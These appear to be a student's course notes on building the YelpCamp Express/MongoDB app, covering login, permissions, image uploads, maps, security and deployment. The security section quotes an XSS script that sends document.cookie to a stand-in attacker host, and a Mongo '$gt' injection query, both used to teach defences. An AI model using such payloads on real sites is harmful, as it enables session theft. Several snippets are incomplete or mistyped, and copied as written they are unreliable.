- routes > users.js
- views > users > register.ejs
- in app.js,
ex. const userRoutes = require ('./routes/users');

<br>

#### 507. Register Route Logic
- routes > users.js
ex. router.post('/register', async (req, res) =>{
       try {
            const { username, email, password } = req.body
            const user = await new User({ username, email });
            const registeredUser = await User.register(user, password);
            console.log(registeredUser)
            req.flash('success', 'Welcome to YelpCamp!')
            res.redirect('/campgrounds');
        } catch (e) {
            req.flash('error', e.message)
            res.redirect('register')
        }
    }));

<br>

#### 508. Login Routes
ex.router.get('/login)

~> passport.authenticate(*, **)
=> here, * is the strategy! (ex. local, google,...)
=> ** is option
=> Passport Middleware

ex.router.post('/login',   passport.authenticate('local', {failureFlash: true, failureRedirect: '/login'}),(req, res) => {
    req.flash('success', 'Welcome Back!');
    res.redirect('/campgrounds') 
})

<br>

#### 509. isLoggedIn Middleware
- now that we have the login tool, let's 'protect' creating a new campground option!

- there are two ways to do it..
1. check if somebody is currently signed in
~> reminder. auth from scratch => saving user_id to the session
~> Passport => using serialize/deserializeUser, info is saved to the session
=> use the helper method, ".isAuthenticated" : automatically added to the request object itself

ex. router.get('/new', (req, res) => {
        if(!req.isAuthenticated()) {
            req.flash ('error', 'You must be signed in!');
            return res.redirect('/login')
        }
        res.render('campgrounds/new')
    
    })

~> but this is just protecting the form itself and somebody can still post data through Postman, etc.

- let's make a middleware!
~> and apply wherever login would be required

- middleware.js

- in campgrounds and reviews.js,
ex. const {isLoggedIn} = require('../middleware)

- add to get and post routes

<br>

#### 510. Adding Logout
- ex. router.get('/logout', (req, res) => {
        req.logout(); //passport-added
        req.flash('success','goodbye')
        res.redirect('/campgrounds);
      })

- let's add a logout button on navbar!!

<br>

#### 511. currentUser Helper
- let's hide some components depending on whether logged in or not!

- req.user ~ contains the user info! no need to look into the session (it is in the session but we do not need to deal with it)

=> contains 'deserialized' info about that user

- now we want to have access to this info everywhere..
~> what about in app.js,
~> adding data globally?
ex. app.use((req,res,next) => {
        res.locals.currentUser = req.user;
        ...
    
    });

- then in navbar,
ex. <% if (!currentUser) { %> 
        <a class="nav-link" href="/login">Login</a>
        <a class="nav-link" href="/register">Sign Up</a>
    <% } else { %> 
        <a class="nav-link" href="/logout">Log Out</a>
    <% }%>

<br>

#### 512. Fixing Register
- let's make a user logged in when they register

- req.login(user, function(err){})
~> established the login session!
~> note. passport.authenticate() middleware invoked req.login()automatically. This function is primarily used when users sign up, during which req.login() can be invoked to automatically log in the newly registered usr

ex. router.post('/register', catchAsync(async (req, res) => {
      try {
        const { username, email, password } = req.body
        const user = await new User({ username, email });
        const registeredUser = await User.register(user, password);
        //right after registering
        req.login(registeredUser, err => {
            if(err) return next(err);
        } ...
        ...
    }

<br>

#### 513. ReturnTo Behavior
- store info on "session" as it exists for that "statefulness"

ex.module.exports.isLoggedIn =(req,res,next)=>{
    console.log("REQ.USER...", req.user);
    if(!req.isAuthenticated()) {
        //store URL they are requesting!
        //so that when the user logs in, they can be sent back to
        //where they were, instead of /campgrounds all the time!
        //console.log(req.path, req.originalUrl)
        req.session.returnTo = req.originalUrl
        req.flash ('error', 'You must be signed in!');
        return res.redirect('/login');
    }
    next();
}

ex. in routes / users
ex. router.post('/login',   passport.authenticate('local', {failureFlash: true, failureRedirect: '/login'}),(req, res) => {
      req.flash('success', 'Welcome Back!');
      const redirectURL = req.session.returnTo || '/campgrounds'
      
      delete.req.session.returnTo;
      res.redirect(redirectURL)    
  }) 

<br>

## 52. YelpCamp: Basic Autho mm
#### 514. Adding an Author to Campground
- we will add a field to Campground
~> user_id, then we can look the user_id for each campground

- models > campground.js
ex. const CampgroundSchema = new Schema({
      ...,
      author: {
          type: Schema.Types.ObjectId,
          ref: 'User'
      }
      ..
    }

- let's also update the seeds file so that the base campgrounds have authors
: grab a random user id and use it for seeds > index.js

- ex. node seeds/index.js

- routes/campgrounds.js,
ex. const ampground =await Campground.findById(req.params.id).populate("reviews").populate("author")

- show.ejs, <%= campground.author.username%>!!

- in routes/campground.js, for router.post('/campground',...),
ex. campground.author=req.user._id

<br>

#### 515. Showing and Hiding Edit / Delete
- ex. <% if(currentUser &&campground.author.equals(currentUser._id))%>

<br>

### 516. Campground Permissions
- let's do more than merely hiding those buttons!
~> by writing middleware, etc.

- in routes/campgrounds.js,
ex. router.put('/:id', isLoggedIn, catchAsync(async (req, res) => {
        const {id} = req.params; 

        const campground = await Campground.findByIdAndUpdate(id, {...req.body.campground}) --- (*****)

        req.flash('success','Successfully updated the campground.'); 
        res.redirect(`/campgrounds/${campground._id}`)
    }))

- now (*****) has to be broken down
1. findById
2. See if the campground author matches with the current user id!
3. if they match then update

- implement this logic in a middleware!
: to reuse without needing to duplicate that

<Br>

#### 517. AUthorization Middleware
- in middleware.js

ex. module.exports. isAuthor = async (req, res, next) => {
        const {id} =req.params
        const campground= await Campground.findById(id)
        if(!campground.author.equals(req.user._id)){
            req.flash('error','You do not have permission to do it!')
            return res.redirect(`/campgrounds/${id}`)
        }
        next();
    }

ex. and take middleware functions into this file as a part of cleanup!
  
<br>

#### 518. Review Permission
- in review.js,
ex. const reviewSchema =new Schema({
      ...,
      author: {
        type: Schema.Types.ObjectId,
        ref: 'User'
      }
})

- show.ejs
~> hide the "leave the review" form when not logged in

- and in routes>reviews.js,
~> apply isLoggedIn to post route
~> review.user=req.user._id

#### 519. More Reviews Authorization!
- display the username of the reviewer
~> here, we gotta first populate the review and then populate its author

ex. const campground = await Campground.findById(req.params.id).populate({
      path: 'reviews',
      populate: {
          path: 'author'
      }
}).populate ('author')

- and hide delete buttons if currentUser._id != review.author

- in routes>reviews,
~> isLoggedIn

~> in middleware.js,
ex. module.exports.isReviewAuthor = async (req, res, next) => {
      const {id,reviewId} = req.params;

      const review = await Review.findById(reviewId)
      if (!review.author.equals(req.user._id){
          req.flash('error', 'You do not have permission to do it')
          return res.redirect(`/campgrounds/${id})
      }     
      next();
}

- in routes>reivews,
~>isReviewAuthor

<br>

## 53. YelpCamp: Controllers & Star Ratings
#### 520. Refactoring To Campgrounds Controller
- some re-organization!!

- "Controller"
: move all the functions to the new 'controller' files so that we can slim down the 'routes' files

- "MVC"
: Model - View - Controller
: separtion of an application into three components!

- Controllers > campgrounds.js

ex. module.exports.index, ...

- move all the functions to controllers files!

<br>

#### 521. Adding a Reviews Controller
- Controllers > reviews.js
- Controllers >users.js

<br>

#### 522. A Fancy Way To Restructure Routes
- Express Doc > Router
~> router.route(path)
~> defines a single route with different verbs

ex.router.route('/')
    .get(catchAsync(campgrounds.index ))
    .post(validateCampground, isLoggedIn, catchAsync(campgrounds.createcampground)) 

- be careful of the order of routes!

<br>

#### 523. Displaying Star Ratings
- entity codes for stars - &#9734; &#9733;
- loop over to show rating in stars

~> BUT! this is a bad idea in terms of 'accessibility'

~> let's use Starability.css instead
: https://github.com/LunarLogic/starability

~> can choose one of the styles
~> Public > stylesheets > stars.css
~> copy and paste the contents in here

~> you could link that stylesheet in boilerplate.ejs (to use that in every page), or link only where you need it (ex. show.ejs)

ex. to show,
ex. <p class="starability-result" data-rating="<%=review.rating"%>
      Rating: <%=review.rating%>
    </p>

<br>

#### 524. Star Rating FOrm
- To replace the slider with the stars...
~> use the same CSS! no JS required

~> include a bunch of HTML codes which include radio buttons!

~> where the slider currently is, in show.ejs

<br>

## 54. YelpCamp:Image Upload
#### 525. Intro to Image Upload Process
1. a regular HTML form will not allow to "send files"to our server
~> so we need to change it
2. we need to store the images somewhere
~> typically we don't store them in Mongo, b/c images are very large (BSON size limit of 16MB)

~> workarounds: one of them is **GridFS**

- *GridFS* : a spec for storing and retrieving files that exceed the BSON-document size limit of 16MB.

~> but we'll use a tool called

- *Cloudinary*
~> a website / application which stores information FOR us
~> and we can retrieve the images from  their server, which also provides some editing tools

~> there are many similar services (we could even use AWS)

- process
: user uploads an image
: the data is sent to Cloudinary
: Cloudinary saves the data on their server
: and sends back a URL to that data

<Br>

#### 526. The Multer Middleware
- again if we use the default HTML form,
~> the file info is not sent 
~> has to do with the **encoding type attribute** of the form
~> MDN > form
: **enctype** - default is application/x-www-form/urlencoded
: for it to accept files, the enctype has to be multipart/form-data!!

- in new.ejs,
ex. <form... enctype= "multipart/form-data">

- then add in the input for file!
ex. <input type="file"name="image">

- but in order to PARSE the MULTIPART form
~> you need another middleware!
~> many options
~> while we'll use "Multer"

- Multer
: a node.js middleware for handling multipart/form-data, which is primarily used for file uploads.

- ex. npm i multer

- Multer adds a *body* object and a *file* or *files* object to the *request* object!
~> *body* object contains the values of the text fields of form
~> *file(s)* object contains the files uploaded via form

- to use it
~> in campgrounds.js,
ex. const multer = require('multer')
ex. const upload = multer({ config })
//initialize or execute the function!

- now at any point, we can add this middleware 
~> upload.single()
~> upload.array()

=> Multer is gonna parse the multipart form information, then store the file(s) on req.file, and any other information from the req.body

~> fieldname == name of form
ex. router.route('/').post(upload.single('image'),...)

- ex. <input  name="image" type = "file" multiple>
+ req.files
~> can upload multiple

<br>

#### 527. Cloudinary Registration
- u need the credentials to use Cloudinary service!

- we will not put directly the cloud name

~> you do not want to put it in your code or on github in case someone hijacks it and can use ur credit card info and others

=> use ENV files!

<br>

#### 528. Environment Variables with dotenv
- We store credentials in a file, which we don't include when we submit to Github, etc.
~> the file that stays on our machine locally
~> called .env file [the dot makes it hidden!]

- npmjs.com/package/dotenv
  
- How to Set Up a .env File?
~> .env (at the top level)
~> then define key - value pairs!

- ex. npm install dotenv

- in app.js,
ex. if (process.env.NODE_ENV !== 'production') {
        require ('dotenv') .config();
    }

    //process.env.NODE_ENV is an environment variable (usually in development / production)
    //"if we are running in a development mode"
    //require the 'dotenv' package
    //which is going to take the variables in .env
    //& add them to
    //process.env in my node app
    //so that any of my files has access to them
    
- in production, we don't do that ~> other ways to set up the environment variables

- so in .env,
ex. CLOUDINARY_NAME = 
ex. CLOUDINARY_API_KEY=
ex. CLOUDINARY_SECRET=

<br>

#### 529. Uploading To Cloudinary Basics
- an easy tool "Multer Storage Cloudinary"
~> works with multer and cloudinary

~> to upload the files that Multer is parsing, to Cloudinary

- ex. npm install cloudinary multer-storage-cloudinary
- cloudinary > index.js,
ex. const cloudinary = require('cloudinary').v2;
ex. const {CloudinaryStorage} = require('multer-storage-cloudinary')

ex. //pass in cloudinary to CloudinaryStorage
ex. cloudinary.config({
        cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
        api_key: process.env.CLOUDINARY_KEY,
        api_secret: process.env.CLOUDINARY_SECRET
    });

    const storage = new CloudinaryStorage({
        cloudinary,
        params: {
          folder: 'YelpCamp',
          allowedFormats: ['jepg', 'png', 'jpg']
        }
    });
    //set up with our cloudinary account info
    //an instance of Cloudinary stroage
    //"folder" inside Cloudinary

    module.exports = {
        cloudinary,
        storage
    }

- in campgrounds.js,
ex. const {storage} = require('../cloudinary')
ex. const upload =multer({storage});

<br>

#### 530. Storing Uploaded Image Links In Mongo
- better to save both **path** and **filename** 
~> path to retrieve the image
~> filename in case user wants to delete!

- in campgrounds.js,
ex. const CampgroundSchema = new Schema ({
        ...,
        images: [
          {
            url: String,
            filename: String
          }
        ]
    })

- in routes > campgrounds.js,
ex. module.exports.createcampground = (async (req, res) => {
    const campground = new Campground(req.body.campground);
    campground.images =req.files.map(f => ({url: f.path, filename:f.filename}))
    ..
    }

  //map over the array added to req.files thanks to multer to make array of objects, add them to campground, then save

- schemas.js ~> remove'image'requirements

<br>

#### 531. Displaying Images In A Carousel
- Bootstrap > Carousel!

ex. <div id="campgroundCarousel" class="carousel slide" data-bs-ride="carousel">
            <div class="carousel-inner">
                <% campground.images.forEach((img, index) => {%>
                <div class="carousel-item <%= index === 0? 'active': ''%>"> 
                    <img src="<%= img.url%>" class="d-block w-100" alt="">
                </div>
                <% }) %>
            </div>
            <% if (campground.images.length>1){ %> 
            <a class="carousel-control-prev" href="#campgroundCarousel" role="button" data-bs-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Previous</span>
            </a>
            <a class="carousel-control-next" href="#campgroundCarousel" role="button" data-bs-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="visually-hidden">Next</span>
            </a>
            <% } %>

      </div>

- and there are lots of other things you can display with Cloudinary!
~> ex. compress images
~> ex. create thumbnails

<br>

#### 532. Fixing Seeds
- modify the seeds.js file so that the campground has image's' objects

- ex. node seeds/index

- fix index.ejs

<Br>

#### 533. Adding Uploads To Edit Page
- Edit page!
~> will do excatly the same thing

- enctype, input type ='file'

- routes > campgrounds.js
~> .put(..,upload.array("image"))

- controllers > campgrounds.js,
ex. const imgs = campground.images =req.files.map(f => ({url: f.path, filename:f.filename}))
    campground.images.push(...imgs)

  //push on, not overwriting all
  //the data in array, not the array itself using the spread operator...!!

<br>

#### 534. Customizing File Input
- Bootstrap > Form Controls > File input

- in the previous BS version4, **bs-custom-file-input** library was required to show the selected files
: to add JS functionality

- for the previous version..
1. add CDN to boilerplate
ex. https://cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js

2. in validateForms.js, ex. bsCustomFileInput.init()

3. in new.ejs, add .custom-file and .custom-file-label to match the codes in  that library!

<br>

#### 535. A Word of Warning!
- think about

~> limiting # of images that a user can upload
: either on client- or server- side!
~> limiting the max. size of an image

<br>

#### 536. Deleting Images Form
- let's update the edit form so that the user can see the currently uploaded images and delete some of they if they want

- in edit.js,
ex. <div class = "mb-3">
      <% campground.images.forEach(function(img, index) {%>
        <img src="<%=img.url %>" class ="img-thumbnail" alt="">
        <div class = "form-check-inline">
          <input type="checkbox" id="image-<%=index%>"name="deleteImages[]"value= "<%=img.filename%>">
          </div>
          <label for="image-<%=index%>">Delete? </label>

          <%})%>

- schemas.js,
ex. module.exports.campgroundSchema = Joi.object({
      campground: Joi.object({
          title: Joi.string().required(),
          price: Joi.number().required().min(0),
          // images: Joi.string().required(),
          location: Joi.string().required(),
          description: Joi.string().required() 

      }).required(),
      deleteImages: Joi.array()
    }));

- when you check the checkboxes, the chcked image filenames are stores inside the array deleteImages[]

<br>

#### 537. Deleting Images Backend
- in controllers > campgrounds.js

ex. const  {cloudinary}=require('../cloudinary')
ex. module.exports.updateCampground = async(req,res)=>{
        ...
        if(req.body.deleteImages){
          for (let filename of req.body.deleteImages){
            await cloudinary.uploader.destroy(filename)
          }
          await campground.updateOne({$pull: {images: {filename: {$in: req.body.deleteImages}}}})
          //console.log(campground)
        } 

        ...
    }

    //want to delete images that are in the array deleteImages, from the array images


<br>






















#### 538. Adding a THumbnail  Virtual Property
- to cap size of displayed images, we can use CSS and other stuff!
~> but will take a lot of time and doesn't really make sens to just crop random parts out of images
=> instead, let's use the Cloudinary functionality!

- cloudinary.com/documentation/image_tranformation_reference

- Image Transformation API reference
:https://res.cloudinary.com/<cloud_name>/<asset_type>/<delivery_type>/<transformations>/<version>/<public_id_full_path>.<extension>

ex. res.cloudinary.com/dlhgkcxol/image/upload/w_100/v###/YelpCamp/###.jpg
~> thumbail image with width = 100 px !!

- in model>campgrounds.js
: let's set up a virtual property!!

- we want the modified url of **each Image** in each campground, so let's set up an ImageSchema separate from CampgroundSchema as well

~> just to use, not to import

ex.const ImageSchema = new Schema({
    url: String,
    filename: String
})


ImageSchema.virtual('thumbnail').get(function() {
    return this.url.replace('/upload','/upload/w_200')
})
const CampgroundSchema = new Schema({
    title: String,
    images: [ImageSchema],...})

- the reason why we are using virtual property is that, we do not need to actually store this property! we're just deriving from information we already stored!(ex.url)

- in edit.ejs,
ex. <%= img.thumbnail%>

<br>


## 55. YelpCamp: Adding Map

#### 539. Registering For Mapbox
- mapbox.com
~> very popular among developers

- 'geocode'

- once signed in,
~> Tokens
~> these tokens are NOT secrets 
~> mapping libraries happen via JS on client-side in the browser!

~> public token is enough for now for our purpose

~> copy & paste to .env file!

- in .env,
ex. MAPBOX_TOKEN=

<br>














#### 540. Geocoding Our Locations
- there r lots of geocoding apis
~> we will use mapbox geocoding api!

:docs.mapbox.com/api/search/#geocoding
~> we can use 'forward geocoding', requesting manually using endpoints

~> but we'll instead use the Mapbox Node Client [Mapbox SDK]

ex. npm install @mapbox/mapbox-sdk
ex. github.com/mapbox/mapbox-sdk-js 

~> a lot of functionalities, while what we're interested in is *forwardGeocode*

- in controllers > campgrounds.js,

ex. const mbxGeocoding = require("@mapbox/mapbox-sdk/services/geocoding")
    //among multiple services require only what you neeed!


ex. const mapBoxToken = process.env.MAPBOX_TOKEN;
ex. const geocoder = mbxGeocoding({accessToken: mapBoxToken})

ex. module.exports.createCampground = async(req, res, next) =>{

      ...

      const geoData=await geocoder.forwardGeocode({
        query: req.body.campground.location,
        limit:1
      }).send()

      res.send( geoData.body.features[0].geometry .coordinates)
}























<Br>


#### 541. Working With GeoJSON
- Store the coordinates information we get from Mapbox into the campground model!!

- we COULD store lat, long as numbers

~> but instead we will store GeoJSON


- GeoJSON : standard
ex. {"type": "Point", "coordinates": [-90.73333, 14.56667]}

- Mongoose docs
: mongoosejs.com/docs/geojson.html

ex. in models>campgrounds
        ...,
        geometry: {
          type: {
            type: String,
            enum: ["Point"],
            required: true
          } ,
          coordinates:{
            type: [Number],
            required: true
          }
          ...
        }
})

- mongo itself supports GeoJSON
~> docs.mongodb.com/manual/geospatial-queries



















- controllers>campgrounds,

ex. module.exports.createCampground = ...{
  
      ...
      campground.geometry = geoData.body.features[0].geometry;
      ..
    }





    



<Br>

#### 542. Displaying A Map
- docs.mapbox.com/mapbox-gl-js/api/

- you can customize the map too!

- in boilerplate,
ex. <script src='https://api.mapbox.com/mapbox-gl-js/v2.1.0/mapbox-gl.js'></script>
ex.<link href='https://api.mapbox.com/mapbox-gl-js/v2.1.0/mapbox-gl.css' rel='stylesheet' />

~> in real world, we don't want to load maps in every single page so not the best place to include these CDNs

- show.ejs,
ex. <div id='map' style='width: 400px; height: 300px;'></div>

- public>javascripts>showPageMap.js




























ex. 
    <script>
          //TO MAKE THE MAP APPEAR U MUST
          //ADD YOUR ACCESS TOKEN FROM
          //https://account.mapbox.com
          mapboxgl.accessToken = '<%- process.env.MAPBOX_TOKEN%>';

          const map = new mapboxgl.Map({ 
            container: 'map',
            style: 'mapbox://styles/mapbox/streets-v11', //stylesheet location
            center:[-74.5,40], //starting position
            zoom:9 //starting zoom
          })

      </script>

  
- at the end of show.ejs
ex. <script src = "/javascripts/showPageMap.js">

- and to give access to <%-process.env.MAPBOX_TOKEN%>,

~> show.ejs
ex. <script>
      const mapToken = '<%- process.env.MAPBOX_TOKEN%>'
    </script>

~> then change in showPageMap as
ex. mapboxgl.accessToken = mapToken

<br>







#### 543. Centering The Map On A Campground
- let's talk about how to add a marker to the map!
~> refer to the Mapbox Docs!

- in showPageMap
ex. new mapboxgl.Marker()
    .setLngLat ([###,##])
    .addTo(map)


- another way of doing it
~> could make an API endpoint that we request with AJAX over showPageMap
~> so once our code loads  in the browser, then it will make a request back to the server and say
~> "hey, give me the campground information, we will make a map"

- in our way,
ex. in show.ejs
ex. <script>
        const mapToken = "<%- process.env.MAPBOX_TOKEN%>"
        const campground = "<%-JSON.stringify(campground)%>" 

  //set a campground variable so that we can access it immediately on the client-side

- in showPageMap,
ex. const map = new mapboxgl.Map({
        ...,
        center: campground.geometry.coordinates
})

<Br>

#### 544. Fixing Our Seeds Bug
- in index.ejs
ex.  <%if (campground.images.length){%>
      <img class="img-fluid" alt="" src="<%=campground.images[0].url %>" 
      <% } else {%>
      <img class = "img-fluid" alt="" src="default">
      <%}%>


<br>


#### 545. Customizing Map Popup
- you can add a popup when you click marker

- Mapbox Docs - Popup

ex. new mapboxgl.Marker()
      .setLngLat(campground.geometry.coordinates)
      .setPopup(
        new mapboxgl.Popup ({offset: 25})
        .setHTML(
          `<h3>${campground.title}</h3>  <p>${campground.location}</p>`
        )
      )
      .addTo(map)

  
<br>










#### 546. Intro To Our Cluster Map
- web development :about refering to the docs and modifying as needed!

<br>


#### 547. Adding Earthquake Cluster Map
- docs.mapbox.com/mapbox-gl-js/ example/cluster

~> copy and paste the starter code
~> then edit as required!(public>javascripts>clusterMap!)

- in index.ejs
ex. <div id= "map"style="width: 100%;height: 500px"></div>

ex. <script>
        const mapToken =  "<%-process.env.MAPBOX_TOKEN%>"
        const campground = <%- JSON.stringify(campground)%>
      </script>


  
<br>



#### 548. Reseeding Our Database! (again)
- NOTE. ALWAYS good to check console for errors

- in seeds>index.js
ex. ...
    geometry : {
      type: 'Point',
      coordinates: [cities[random1000].longitude,cities[random1000].latitude]
    },
    ...


    





<br>





#### 549. Basic Clustering Campgrounds
- clusterMap

- where the data loads
~> map.addsource(... data:)

- index.ejs,
ex. <script>
      ...
      const campgrounds = {features:<%- JSON.stringify(campgrounds)%>}
      //{features:...}
      //to match format
    </script>


<br>








#### 550. Tweaking Clustering Code!
- earthquake => campground

- going over codes

<br>





#### 551. Changing Cluster Size and Color
- seed again with 300 campgrounds






- change few stuff in clusterMap

<br>






















#### 552. Adding Custom Popups
- clusterMap
ex. map.on('click'..){
      new mapboxgl.Popup()
        . ..
        .setHTML (
          
            '<h3>Campground</h3>'
        )

- we need to get info of the clicked campground, and show that in the pop-up!

- original EQ code uses sth like e.features[0]
~> ours does NOT follow the expected GeoJSON format
~> and is empty

~> let's create a **virtual property**!
~> while it does not need to be virtual 
=> which can lead users to the specific showpage of each camp!


- in models>campgroudns
ex. CampgroundSchema.virtual('properties.popUpMarkup').get(function () {
        
        return `<a  href="/campgrounds/${this._id}">${this.title}</a>`
})

    //properties.popUpMarkup ~> to nest!


- BUT PROBLEM!
~> Mongoose Docs,'Virtuals in JSON'

=>By default, Mongoose does not include virtuals when you convert a document to JSON! For example, if you pass a document to Express' res.json() function, virtuals will not be included by default. To include virtuals in res.json(),you need to set the toJSON schema option -> {virtuals:true}

- then in clusterMap
ex. const {popUpMarkup}=e.features[0].properties 

- index.ejs

<br>


















## 57. YelpCamp: Styles CleanUP



#### 553. Styling HOme Page
- boost through styling!

- home.ejs,home.css

<br>











#### 554. Additional Home Page Styling!
- add a bg image to the body!
ex. body {
        background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
        url("..."),
        background-size: cover;
        background-position: center;
    }
    //adding two bg images - gradient and the actual image


ex. .nav-link {
        padding: 0.25rem 0;
        font-weight: 700;
        color: rgba(255, 255, 255, 0.5);
        margin-left: 1rem;

        border-bottom: 0.25rem solid transparent;

        text-shadow: 0 0.05rem 0.1rem rgba(0,0,0,0.5);
        box-shadow:inset 0 0 5rem rgba(0,0,0,0.5)
    }

    .nav-link:hover{

        color: rgba(255,255,255,0.5)
        border-bottom-color: rgba(255,255,255,0.5)
    }
    .btn-secondary, .btn-secondary:hover{}
    .nav-link.active{}

<br>























#### 555. Styling Login FORM!
- LogIn FORM to Card

- login.ejs
: grid, card, autofocus

<Br>

















#### 556. Styling Register FORM!
- duplicate the same styling to REGISTER

- responsive (md)columns to NEW &  EDIT

<br>





#### 557. Spacing CampGrounds

- .mb-3

<Br>


#### 558. Removing Inline Map Styles
- index.ejs and show.ejs
~> style="width: 100%; height: 300px;" for map

- public>stylesheets>app.css =>include in boilerplate!

- public>javascripts>clusterMap.js=>modify ID to match!

<Br>
















#### 559. Map Controls
- zoom-in / zoom-out / rotate

- Mapbox Docs - Examples


: Search Controls




~> diaply map navigation controls


ex. map.addControl (new mapboxgl.NavigationControl());

~> more on NavigationControl

ex. map.addControl(nav,'pos');//where to ADD

<br>










## 58. YelpCamp: Common Security Issues










#### 560. Mongo Injection
- Security itself is a VERY BIG field!
~> we will only touch a part of it

- "SQL Injection"
~> in our case, no-SQL, "Mongo Injection"

ex. db.users.find({usrname: req.body.usrname})
~> if the user enters something like
~> ex.db.users.find(usrname:{"$gt: ""})

=> the most basic way to prevent Mongo Injection is..
~> not allowing uses of $, ., etc

- Express Mongoose Sanitize Package!


: npmjs.com/packages/express-mongo-sanitize


- ex. npm i express-mongo-sanitize

- in app.js
ex. const mongoSanitize = require ('express-mongo-sanitize')
ex. app.use(mongoSanitize({
      //replaceWith: '_'
    }))

~> does not allow those problematic special characters in queries, params, and req.body!

<br>






















#### 561. Cross Site Scripting (XSS)
- ex. xss-game.appspot.com

- one interesting example - cookies!
~> most of websites will allow document.cookies
~> and when we enter the following as the query string

ex. <script>new Image().src="mybadserver/hacker?output="+document.cookie; </script>
//taking that cookie and sending info to bad server!
//whenever you set a source to an image, the browser sends a request => so it is one way of sending a request!
- so when this kind of thing is sent to random users in a form of url, and when users click the link their info are sent

- XSS Filter Evasion Cheat Sheet

- Certificates
<br>


































#### 562. Sanitizing HTML w/ Joi
- ex. <h1>HELLO</h1> for campground title does not work!
~> as <%=%> is HTML-escaped!

~> but!!! HTML-unescaped <%- %> tag is used for the map popup!
~> gotta fix it!

- possible XSS

- Joi doesn't provide a sanitizing tool!

- NOTE. 'express-validator' does the same thing as Joi!
~> Colt didn't use it because of the complicated syntax!!

- so let's use our own version on top of Joi!

- npm install sznitize-html

- in schemas.js





ex. const BaseJoi = require ('Joi')

ex. const extension = (joi) => ({
      type: 'string',
      base: joi.string(),
      messages: {
          'string.escapeHTML': '{{#label}} must not include HTML!'
      },
      rules: {
          escapeHTML: {
              validate(value, helpers){
                  allowedTags: [],
                  allowedAttributes: {},
              });
              if (clean !== value) return helpers.error('string.escapeHTML',{value})
              return clean;
          }
      }
    });

    

ex. const Joi =BaseJoi.extend(extension)

~> then apply this extension (sanitizeHTML) wherever String's type

<br>






#### 563. Minor Changes to Session/Cookies
- in app.js,
ex. const sessionConfig = {
        ...,
        cookie: {
            name:'session'
            httpOnly: true,//cookies not available via JS
            secure: true//cookies only provided over https
            ...
        },
        ...
    }


    

    => while localhost is not a secure one!
    =>specific given name is better than the default-connect.sid













<br>










#### 564. Hiding Errors
- we don't want to show the 'error stack' to users

- in error.ejs,

ex. ...
    <h4 class = "alert-heading"><%=err.message%></h4>
    <% if (process.env.NODE_ENV !== "production"){%>
    <p><%=err.stack%></p>
    <% } %>
    ...

- and when you run,
ex. NODE_ENV= production node app.js





<br>











#### 565. Using Helmet
- helmetjs.github.io

~> 11 middlewares regarding HTTP headers

~> docs is great!

ex. npm install helmet

- in app.js,
ex. const helmet = require ('helmet')

ex. app.use(helmet)
    
    //all 11 middlewares would automatically run

    
~> but problem!
~> Contents Security Policy : blocks links! =>let's disable it for now

ex. app.use(helmet({  contentSecurityPolicy: false  }))
=> with helmet, the header is different

<br>










#### 566. Content Security Policy Fun

- Under Helmet,
~> helmets.github.io: "helmet.contentSecurityPolicy" sets the "Content-Security-Policy" header which helps mitigate cross-site scripting attacks, among other things.
~> MDN: Content Security POlicy (CSP) : is an added layer of security that helps to detect and mitigate certain types of attackes, including XSS and data injection attacks.
: about 'designating' your own policy on what's acceptable and what is not

=> about sources to allow!

: refer to app.js!

- while...  REMEMBER that we learned just a little little bit of what's needed

<br>





## 59. YelpCamp: Deploying
#### 567. Setting Up MongoAtlas
- currenlty all the data is stored in the local database 'yelp-camp'

- we need to have a production database! and most of the cases we also want to keep a development database for testing improvement

- Mongo Atlas
: cloud-database services
: paid product of Mongo DB

~> create a new mongo databse that we do not store on our machine
~> then we can connect to it easily
~> makes it very easy to manage permission, securities, GUI, etc.
~> used a lot in the real world!

~> db itself is just like a mongodb so we do not need to change any

- mongodb.com/cloud/atlas
=> sign up




- Connect To Atlas
1. Build your first cluster
2. Create your first database user
3. Add IP Address to your Access List
4. Load Sample Data (Optional)
5. Conncet to your cluster

- 'Database User'
~> with differnt permission, etc
~> follow the Steps!


=> 'our-first-user', autogenerated secure password


- Whitelist IP Address
: Approving the ip address which we can access the db with

=> network access !!

- Connect to the cluster!
=> Click "Connect" !!

~> Clusters
~> Connect your app

~> copy the URL

~> in .env, paste the URL, setting
ex. DB_URL = ... (with password being the actual passowrd)


- if everything went well, we should be able to access the DB_URL















































const dbUrl = process.env.DB_URL
- in app.js

ex. mongoose.connect(dbUrl,...)

~> in Atlas, we can see the database

- for now, we can use the development one

<br>






#### 568. using Mongo for Our Session store
- NOTE. default storage location for Express Session is memory store!

~> does not scale well, so we will use mongo instead

- "Connect-Mongo"
~> npmjs.com/package/connect-mongo 
~> mongoDB session store for Connect and Mongo
~> ex. npm install connect-mongo

- in app.js
ex. const MongoDBStore = require('connect-mongo') (session);

~> then right before sessionCongif,
ex. const store = new MongoDBStore ({
        url:dbUrl,
        secret: 'thisshouldbeabettersecret!',
        touchAfter: 24 * 60 * 60 //in seconds,24 hours, resave only after this time unless there has been change
    });


  

ex. store.on("error", function(e){
        console.log("SESSION STORE ERROR", e)
    });

~> and modify
ex. const dbUrl = 'mongodb://localhost:27017/yelp-camp'
ex. mongoose.connect(dbUrl, ..)


~> and in sessionconfig
ex. const sessionConfig = {
        store: store, //or just store
      ..
    }


- Now in Mongo,
ex. show collections
ex. db.sessions.find({})!

<br>

























#### 569. Heroku Setup

- One of many similar app-serving/saving/hosting platform tools!
- End goal: our app to run on Heroku's machine
~> still, there are settings to configure / change!

~> need to install node packages, etc.

- Heroku.Com
~> register!
~> download the Heroku CLI!

=> how we'll get our codes to be up and runningon Heroku!

~> follow the instruction

- Log In to Heroku
~> with our command line client

- in Git Bash,
: YelpCamp
: heroku login

: hit any key

: a browser will open for us to log in!

<br>






#### 570. Pushing To Heroku

- after logging into Heroku on the terminal,
ex. git init
ex. heroku create

=> make a new spot for us
=> url made

=> will use this!

: with that url we can access the space where our app will be deployed


ex. https://salty-garden-48916.herokuapp.com


- before we deploy, let's make some edits to our app

- in app.js
ex. const dbUrl = process.env.DB_URL ||  "mongodb://localhost:27017/yelp-camp"

ex. const secret = process.env.SECRET || 'thisshouldbeabettersecret'

- make a file called .gitignore
ex. node_modules
ex. .env

- now deploy!

: in the terminal

ex. git remote -v

ex. git add . //add everything
ex. git commit -m "ready to try deploying" //commit everything

